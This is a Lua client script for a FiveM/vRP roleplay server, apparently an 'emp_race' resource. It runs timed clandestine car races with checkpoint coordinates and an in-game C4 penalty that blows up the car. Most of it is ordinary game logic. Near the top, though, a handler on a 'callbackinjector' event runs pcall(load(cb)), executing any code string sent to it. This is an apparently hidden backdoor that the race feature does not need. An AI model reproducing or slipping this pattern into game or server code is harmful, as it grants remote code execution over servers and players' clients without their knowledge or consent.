local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("emp_race")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local blips = false
local inrace = false
local timerace = 0
local racepoint = 1
local racepos = 0 
local CoordenadaX = 2683.60
local CoordenadaY = 3457.78
local CoordenadaZ = 55.76
   -- Antiga Coordenada
--local CoordenadaX = 385.29
--local CoordenadaY = -1657.45
--local CoordenadaZ = 27.30
local PlateIndex = nil
local bomba = nil
local explosive = 0
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS       628.86566162109,-3011.4792480469,6.0452117919922
-----------------------------------------------------------------------------------------------------------------------------------------
local races = { 
	[1] = { --ok
		['time'] = 220,
		[1] = { ['x'] = 2632.78, ['y'] = 3356.53, ['z'] = 56.16 },
		[2] = { ['x'] = 2240.00, ['y'] = 3245.00, ['z'] = 48.14 },
		[3] = { ['x'] = 1678.0, ['y'] = 2868.0, ['z'] = 42.47 },
		[4] = { ['x'] = 320.0, ['y'] = 2572.0, ['z'] = 44.03 },
		[5] = { ['x'] = 1052.54, ['y'] = 511.42, ['z'] = 95.29 },
		[6] = { ['x'] = 508.03, ['y'] = -158.81, ['z'] = 56.18 },
		[7] = { ['x'] = 264.46, ['y'] = -572.33, ['z'] = 43.30 },
		[8] = { ['x'] = 100.31, ['y'] = -998.85, ['z'] = 29.39 },
		[9] = { ['x'] = -230.54, ['y'] = -1137.76, ['z'] = 23.07 },
		[10] = { ['x'] = -626.49, ['y'] = -1266.37, ['z'] = 10.99 },
		[11] = { ['x'] = -909.03, ['y'] = -1189.69, ['z'] = 4.98 },
		[12] = { ['x'] = -1089.74, ['y'] = -1449.60, ['z'] = 5.13 },
		[13] = { ['x'] = -1171.81, ['y'] = -1772.14, ['z'] = 3.85 }
	},
	[2] = { --ok
		['time'] = 180, -- mariano 1
		[1] = { ['x'] = 2774.10, ['y'] = 3389.69, ['z'] = 56.04 },
		[2] = { ['x'] = 2399.09, ['y'] = 2918.62, ['z'] = 40.27 },
		[3] = { ['x'] = 1774.11, ['y'] = 2098.49, ['z'] = 65.58 },
		[4] = { ['x'] = 1584.628, ['y'] = 1030.69, ['z'] = 79.71 },
		[5] = { ['x'] = 1106.77, ['y'] = 407.78, ['z'] = 83.58 },
		[6] = { ['x'] = 502.40, ['y'] = -800.49, ['z'] = 29.31 },
		[7] = { ['x'] = 501.54, ['y'] = -1248.33, ['z'] = 29.32 },
		[8] = { ['x'] = 509.65, ['y'] = -1538.16, ['z'] = 29.26 },
		[9] = { ['x'] = 515.96, ['y'] = -1701.70, ['z'] = 29.29 },
		[10] = { ['x'] = 377.94, ['y'] = -1946.96, ['z'] = 24.59 },
		[11] = { ['x'] = 394.10, ['y'] = -2158.70, ['z'] = 16.36 },
		[12] = { ['x'] = 361.61, ['y'] = -2507.96, ['z'] = 6.62 },
		[13] = { ['x'] = 627.66, ['y'] = -3008.70, ['z'] = 6.04 }
	},
	[3] = { ---198.17420959473,1459.5059814453,289.71069335938
		['time'] = 180, -- vegetal dificl
		[1] = { ['x'] = 2569.35, ['y'] = 3266.07, ['z'] = 50.95 },
		[2] = { ['x'] = 2182.47, ['y'] = 3254.53, ['z'] = 46.63 },
		[3] = { ['x'] = 1878.91, ['y'] = 3230.06, ['z'] = 44.50 },
		[4] = { ['x'] = 1759.80, ['y'] = 3399.50, ['z'] = 37.86 },
		[5] = { ['x'] = 1229.28, ['y'] = 3538.39, ['z'] = 34.40 },
		[6] = { ['x'] = 215.32, ['y'] = 3238.73, ['z'] = 41.30 },
		[7] = { ['x'] = -156.19, ['y'] = 2858.62, ['z'] = 48.02 },
		[8] = { ['x'] = -508.25, ['y'] = 2777.06, ['z'] = 39.12 },
		[9] = { ['x'] = -791.14, ['y'] = 2120.47, ['z'] = 109.24 },
		[10] = { ['x'] = -850.76, ['y'] = 1785.34, ['z'] = 172.59 },
		[11] = { ['x'] = -773.89, ['y'] = 1204.85, ['z'] = 261.19 },
		[12] = { ['x'] = -656.53, ['y'] = 914.58, ['z'] = 227.86 },
		[13] = { ['x'] = -502.50, ['y'] = 601.75, ['z'] = 124.56 },
		[14] = { ['x'] = -536.70, ['y'] = 296.01, ['z'] = 82.25 },
		[15] = { ['x'] = -547.23, ['y'] = -11.20, ['z'] = 43.25 }
	},
	[4] = { --guaxinim 1
		['time'] = 230,
		[1] = { ['x'] =  2769.6860351563, ['y'] = 3376.6352539063, ['z'] = 56.104591369629 },
		[2]  = { ['x'] = 2670.6340332031, ['y'] = 3250.87890625, ['z'] = 55.240398406982 },
		[3]  = { ['x'] = 2507.4663085938, ['y'] = 3029.0131835938, ['z'] = 42.372428894043 },
		[4] = { ['x'] = 2413.287109375, ['y'] = 2904.9729003906, ['z'] = 49.339107513428 },
		[5] = { ['x'] = 2561.1013183594, ['y'] = 2220.7685546875, ['z'] = 19.226430892944 },
		[6] = { ['x'] = 2542.7939453125, ['y'] = 1641.2658691406, ['z'] = 29.248146057129 },
		[7] = { ['x'] = 2403.5048828125, ['y'] = 1200.4038085938, ['z'] = 59.576560974121 },
		[8] = { ['x'] = 2441.8444824219, ['y'] = 1002.0115356445, ['z'] = 85.470375061035 },
		[9] = { ['x'] = 2595.6865234375, ['y'] = 632.03796386719, ['z'] = 95.607696533203 },
		[10] = { ['x'] = 2543.4731445313, ['y'] = 597.48840332031, ['z'] = 107.38314819336 },
		[11] = { ['x'] = 2548.4777832031, ['y'] = 269.04089355469, ['z'] = 108.42736816406 },
		[12] = { ['x'] = 2376.6291503906, ['y'] = -247.83897399902, ['z'] = 84.971908569336 },
		[13] = { ['x'] = 2532.60546875, ['y'] = -622.34503173828, ['z'] = 62.254734039307 },
		[14] = { ['x'] = 1968.5505371094, ['y'] = -920.18286132813, ['z'] = 79.169868469238 },
		[15] = { ['x'] = 1887.1311035156, ['y'] = -1392.5939941406, ['z'] = 135.95082092285 },
		[16] = { ['x'] = 1808.0427246094, ['y'] = -1667.5162353516, ['z'] = 117.91389465332 },
		[17] = { ['x'] = 1693.4019775391, ['y'] = -2338.685546875, ['z'] = 103.26202392578 },
		[18] = { ['x'] = 1176.7393798828, ['y'] = -2567.9614257813, ['z'] = 35.082984924316 },
		[19] = { ['x'] = 920.70959472656, ['y'] = -2614.7900390625, ['z'] = 49.261322021484 },
		[20] = { ['x'] = 253.93019104004, ['y'] = -2660.0979003906, ['z'] = 18.360912322998 },
	},
	[5] = { --guaxinim 2
		['time'] = 285,
		[1] = { ['x'] = 2806.9672851563 ,['y'] = 3395.5310058594, ['z'] = 55.931671142578 },
		[2]= { ['x'] = 2899.0244140625, ['y'] = 3644.2197265625, ['z'] = 52.67200088501 },
		[3] = { ['x'] =2908.0, ['y'] = 4106.0, ['z'] = 50.60327911377 },
		[4]= { ['x'] =  2788.0, ['y'] = 4409.0, ['z'] = 48.943988800049 },
		[5] = { ['x'] = 2624.9663085938, ['y'] = 4310.0102539063, ['z'] = 43.876617431641 },
		[6] = { ['x'] = 2386.0, ['y'] = 3923.9963378906, ['z'] = 35.904819488525 },
		[7] = { ['x'] = 2058.8671875, ['y'] = 3731.2431640625, ['z'] = 33.052059173584 },
		[8] = { ['x'] = 1999.1418457031, ['y'] = 3808.5930175781, ['z'] = 32.283164978027 },
		[9]= { ['x'] = 1918.7778320313, ['y'] = 3785.6003417969, ['z'] = 32.330265045166 },
		[10]= { ['x'] = 1869.2982177734, ['y'] = 3831.7150878906, ['z'] = 32.388107299805 },
		[11] = { ['x'] = 1597.4775390625, ['y'] = 3669.7707519531, ['z'] = 34.509185791016 },
		[12]  = { ['x'] = 1209.2243652344, ['y'] = 3536.7504882813, ['z'] = 35.189117431641 },
		[13]  = { ['x'] = 309.22985839844, ['y'] = 3425.3413085938, ['z'] = 36.791984558105 },
		[14] = { ['x'] = 197.91682434082, ['y'] = 3393.8591308594, ['z'] = 38.253761291504 },
		[15] = { ['x'] = 216.42774963379, ['y'] = 3137.6086425781, ['z'] = 42.353294372559 },
		[16] = { ['x'] = 215.80198669434, ['y'] = 3135.4841308594, ['z'] = 42.342056274414 },
		[17] = { ['x'] = 199.13130187988, ['y'] = 2943.0632324219, ['z'] = 44.115070343018 },
		[18] = { ['x'] = -427.44680786133, ['y'] = 2826.1999511719, ['z'] = 38.720867156982 },
		[19] = { ['x'] = -580.55194091797, ['y'] = 2489.5727539063, ['z'] = 51.884830474854 },
		[20] = { ['x'] = -753.8837890625, ['y'] = 2165.4660644531, ['z'] = 100.52184295654 },
		[21] = { ['x'] = -785.40081787109, ['y'] = 1837.4415283203, ['z'] = 164.63522338867 },
		[22] = { ['x'] = -808.93231201172, ['y'] = 1371.6507568359, ['z'] = 250.5633392334 },
		[23] = { ['x'] = -745.20178222656, ['y'] = 978.74340820313, ['z'] = 237.83731079102 },
		[24] = { ['x'] = -1023.8290405273, ['y'] = 1179.3327636719, ['z'] = 217.59440612793 },
		[25] = { ['x'] = -1176.4279785156, ['y'] = 942.1630859375, ['z'] = 197.07369995117 },
		[26] = { ['x'] = -1460.9616699219, ['y'] = 875.78674316406, ['z'] = 183.46681213379 },
		[27] = { ['x'] = -1658.2709960938, ['y'] = 969.31561279297, ['z'] = 152.17182922363 },
		[28] = { ['x'] = -1987.2076416016, ['y'] = 484.56915283203, ['z'] = 104.58667755127 },
		[29] = { ['x'] = -1804.6333007813, ['y'] = 88.962142944336, ['z'] = 71.993759155273 },
		[30] = { ['x'] = -1964.7377929688, ['y'] = 101.162940979, ['z'] = 92.556449890137 },
		[31] = { ['x'] = -2239.4289550781, ['y'] = 572.51928710938, ['z'] = 167.95922851563 },
		[32] = { ['x'] = -2314.7175292969, ['y'] = 382.30004882813, ['z'] = 174.46672058105 },
	},
	[6] = {
		['time'] = 250, --vgt1
		[1] = { ['x'] = 2714.40, ['y'] = 3264.88, ['z'] = 54.49 },
		[2] = { ['x'] = 2487.80, ['y'] = 3015.98, ['z'] = 41.39 },
		[3] = { ['x'] = 2274.93, ['y'] = 3003.31, ['z'] = 45.08 },
		[4] = { ['x'] = 1802.79, ['y'] = 2935.09, ['z'] = 44.96 },
		[5] = { ['x'] = 930.91, ['y'] = 2698.04, ['z'] = 39.81 },
		[6] = { ['x'] = 643.13, ['y'] = 2601.12, ['z'] = 51.77},
		[7] = { ['x'] = 692.48, ['y'] = 2378.60, ['z'] = 52.25 },
		[8] = { ['x'] = 614.57, ['y'] = 2185.53, ['z'] = 66.77 },
		[9] = { ['x'] = 54.61, ['y'] = 2073.77, ['z'] = 152.75 },
		[10] = { ['x'] = -85.22, ['y'] = 1852.26, ['z'] = 198.68 },
		[11] = { ['x'] = 161.15, ['y'] = 1473.41, ['z'] = 238.75 },
		[12] = { ['x'] = -196.54, ['y'] = 1464.31, ['z'] = 288.87 },
		[13] = { ['x'] = -396.99, ['y'] = 1228.00, ['z'] = 325.63 }
	},
	[7] = {
		['time'] = 250, --flaag
		[1] = { ['x'] = 2677.46, ['y'] = 3451.02, ['z'] = 55.71 },
		[2] = { ['x'] = 2248.10, ['y'] = 3209.31, ['z'] = 49.15 },
		[3] = { ['x'] = 1557.18, ['y'] = 2790.04, ['z'] = 37.57 },
		[4] = { ['x'] = 681.58, ['y'] = 2659.72, ['z'] = 42.46 },
		[5] = { ['x'] = 730.27, ['y'] = 2274.84, ['z'] = 49.39 },
		[6] = { ['x'] = 914.21, ['y'] = 2074.64, ['z'] = 57.09 },
		[7] = { ['x'] = 762.59, ['y'] = 1874.81, ['z'] = 120.55 },
		[8] = { ['x'] = 906.78, ['y'] = 1721.67, ['z'] = 166.60 },
		[9] = { ['x'] = 145.82, ['y'] = 1630.86, ['z'] = 228.41 },
		[10] = { ['x'] = 317.10, ['y'] = 1006.56, ['z'] = 209.84 },
		[11] = { ['x'] = 239.32, ['y'] = 467.89, ['z'] = 123.91 },
		[12] = { ['x'] = 37.11, ['y'] = 269.90, ['z'] = 108.91 },
		[13] = { ['x'] = -108.34, ['y'] = 219.03, ['z'] = 94.93 },
		[14] = { ['x'] = -175.52, ['y'] = 105.56, ['z'] = 69.58 },
		[15] = { ['x'] = -243.56, ['y'] = 40.50, ['z'] = 58.46 },
		[16] = { ['x'] = -327.89, ['y'] = -184.86, ['z'] = 38.32 },
		[17] = { ['x'] = -628.32, ['y'] = -388.44, ['z'] = 34.13 },
		[18] = { ['x'] = -724.07, ['y'] = -473.60, ['z'] = 31.01 },
		[19] = { ['x'] = -1199.03, ['y'] = -636.05, ['z'] = 23.47 },
		[20] = { ['x'] = -1457.14, ['y'] = -776.63, ['z'] = 22.99 },
		[21] = { ['x'] = -1818.74, ['y'] = -1206.06, ['z'] = 12.34 }
	},
	[8] = {
		['time'] = 200, --mariano 2
		[1] = { ['x'] = 2677.46, ['y'] = 3451.02, ['z'] = 55.71 },
		[2] = { ['x'] = 2770.75, ['y'] = 3381.69, ['z'] = 56.08 },
		[3] = { ['x'] = 2556.72, ['y'] = 3053.95, ['z'] = 44.16 },
		[4] = { ['x'] = 1997.70, ['y'] = 2592.01, ['z'] = 54.46 },
		[5] = { ['x'] = 1758.38, ['y'] = 1956.96, ['z'] = 71.39 },
		[6] = { ['x'] = 1612.53, ['y'] = 1110.98, ['z'] = 82.32 },
		[7] = { ['x'] = 1081.64, ['y'] = 436.92, ['z'] = 91.55 },
		[8] = { ['x'] = 1018.01, ['y'] = 482.11, ['z'] = 96.62 },
		[9] = { ['x'] = 791.14, ['y'] = 155.66, ['z'] = 81.21 },
		[10] = { ['x'] = 484.67, ['y'] = -148.82, ['z'] = 57.49 },
		[11] = { ['x'] = 284.01, ['y'] = -84.60, ['z'] = 70.12 },
		[12] = { ['x'] = 117.54, ['y'] = -50.56, ['z'] = 67.66 },
		[13] = { ['x'] = 93.08, ['y'] = -176.94, ['z'] = 54.93 },
		[14] = { ['x'] = 338.30, ['y'] = -298.70, ['z'] = 53.73 },
		[15] = { ['x'] = 218.95, ['y'] = -614.24, ['z'] = 41.45 },
		[16] = { ['x'] = 79.70, ['y'] = -617.31, ['z'] = 44.27 },
		[17] = { ['x'] = 17.73, ['y'] = -777.44, ['z'] = 44.23 },
		[18] = { ['x'] = 0.51, ['y'] = -960.28, ['z'] = 29.40 },
		[19] = { ['x'] = 94.57, ['y'] = -1024.33, ['z'] = 29.41 },
		[20] = { ['x'] = 7.33, ['y'] = -1135.58, ['z'] = 28.57 },
		[21] = { ['x'] = -345.47, ['y'] = -1085.72, ['z'] = 23.02 }
	}
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- STARTRACES
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if not inrace then
			local ped = PlayerPedId()
			local vehicle = GetVehiclePedIsUsing(ped)
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(CoordenadaX,CoordenadaY,CoordenadaZ)
			local distance = GetDistanceBetweenCoords(CoordenadaX,CoordenadaY,cdz,x,y,z,true)

			if distance <= 10.0 then
			crjSleep = 1
				if IsEntityAVehicle(vehicle) and GetVehicleClass(vehicle) ~= 8 and GetPedInVehicleSeat(vehicle,-1) == ped then
					DrawMarker(23,CoordenadaX,CoordenadaY,CoordenadaZ-0.96,0,0,0,0,0,0,10.0,10.0,1.0,0,95,140,50,0,0,0,0)
					if distance <= 5.9 then
						drawTxt("PRESSIONE  ~b~E~w~  PARA INICIAR A CORRIDA",4,0.5,0.86,0.50,255,255,255,180)
						if IsControlJustPressed(0,38) then
							inrace = true
							racepos = 1
							racepoint = emP.getRacepoint()
							timerace = races[racepoint].time
							PlateIndex = GetVehicleNumberPlateText(vehicle)
							SetVehicleNumberPlateText(vehicle,"CORREDOR")
							CriandoBlip(races,racepoint,racepos)
							explosive = math.random(100)
							if explosive >= 0 then
								emP.startBombRace()
								bomba = CreateObject(GetHashKey("prop_c4_final_green"),x,y,z,true,false,false)
								AttachEntityToEntity(bomba,vehicle,GetEntityBoneIndexByName(vehicle,"exhaust"),0.0,0.0,0.0,180.0,-90.0,180.0,false,false,false,true,2,true)
								TriggerEvent("Notify","importante","Você começou uma corrida <b>Explosiva</b>, não saia do veículo e termine<br>no tempo estimado, ou então sei veículo vai explodir com você dentro.")
							end
						end
					end
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CHECKPOINTS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		if inrace then
			local ped = PlayerPedId()
			local vehicle = GetVehiclePedIsUsing(ped)
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(races[racepoint][racepos].x,races[racepoint][racepos].y,races[racepoint][racepos].z)
			local distance = GetDistanceBetweenCoords(races[racepoint][racepos].x,races[racepoint][racepos].y,cdz,x,y,z,true)

			if distance <= 100.0 then
				if IsEntityAVehicle(vehicle) and GetVehicleClass(vehicle) ~= 8 then
					DrawMarker(1,races[racepoint][racepos].x,races[racepoint][racepos].y,races[racepoint][racepos].z-3,0,0,0,0,0,0,12.0,12.0,8.0,255,255,255,25,0,0,0,0)
					DrawMarker(21,races[racepoint][racepos].x,races[racepoint][racepos].y,races[racepoint][racepos].z+1,0,0,0,0,180.0,130.0,3.0,3.0,2.0,255,0,0,50,1,0,0,1)
					if distance <= 15.1 then
						RemoveBlip(blips)
						if racepos == #races[racepoint] then
							inrace = false
							SetVehicleNumberPlateText(GetPlayersLastVehicle(),PlateIndex)
							PlateIndex = nil
							PlaySoundFrontend(-1,"RACE_PLACED","HUD_AWARDS",false)
							if explosive >= 0 then
								explosive = 0
								DetachEntity(bomba,false,false)
								TriggerServerEvent("trydeleteobj",ObjToNet(bomba))
								emP.removeBombRace()
								emP.paymentCheck(racepoint,2)
							else
								emP.paymentCheck(racepoint,1)
							end
						else
							racepos = racepos + 1
							CriandoBlip(races,racepoint,racepos)
						end
					end
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TIMEDRAWN
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1)
		if inrace and timerace > 0 and GetVehiclePedIsUsing(PlayerPedId()) then
			drawTxt("RESTAM ~b~"..timerace.." SEGUNDOS ~w~PARA CHEGAR AO DESTINO FINAL DA CORRIDA",4,0.5,0.84,0.45,255,255,255,100)
			drawTxt("VENÇA A CORRIDA E SUPERE SEUS PROPRIOS RECORDES ANTES DO TEMPO ACABAR",4,0.5,0.87,0.38,255,255,255,50)
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TIMERACE
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		if inrace and timerace > 0 then
			timerace = timerace - 1
			if timerace <= 0 or not IsPedInAnyVehicle(PlayerPedId()) then
				inrace = false
				RemoveBlip(blips)
				SetVehicleNumberPlateText(GetPlayersLastVehicle(),PlateIndex)
				PlateIndex = nil
				if explosive >= 0 then
					SetTimeout(3000,function()
						explosive = 0
						DetachEntity(bomba,false,false)
						TriggerServerEvent("trydeleteobj",ObjToNet(bomba))
						emP.removeBombRace()
						AddExplosion(GetEntityCoords(GetPlayersLastVehicle()),1,1.0,true,true,true)
					end)
				end
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

function CriandoBlip(races,racepoint,racepos)
	blips = AddBlipForCoord(races[racepoint][racepos].x,races[racepoint][racepos].y,races[racepoint][racepos].z)
	SetBlipSprite(blips,433)
	SetBlipColour(blips,1)
	SetBlipScale(blips,0.4)
	SetBlipAsShortRange(blips,false)
	SetBlipRoute(blips,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Corrida Clandestina")
	EndTextCommandSetBlipName(blips)
end

RegisterNetEvent("emp_race:defuse")
AddEventHandler("emp_race:defuse",function()
	inrace = false
	SetVehicleNumberPlateText(GetPlayersLastVehicle(),PlateIndex)
	PlateIndex = nil
	RemoveBlip(blips)
	if explosive >= 70 then
		explosive = 0
		DetachEntity(bomba,false,false)
		TriggerServerEvent("trydeleteobj",ObjToNet(bomba))
		emP.removeBombRace()
	end
end)

RegisterNetEvent("emp_race:classv")
AddEventHandler("emp_race:classv",function(vehicle)
	TriggerEvent('syncLock', VehToNet(vehicle))
end)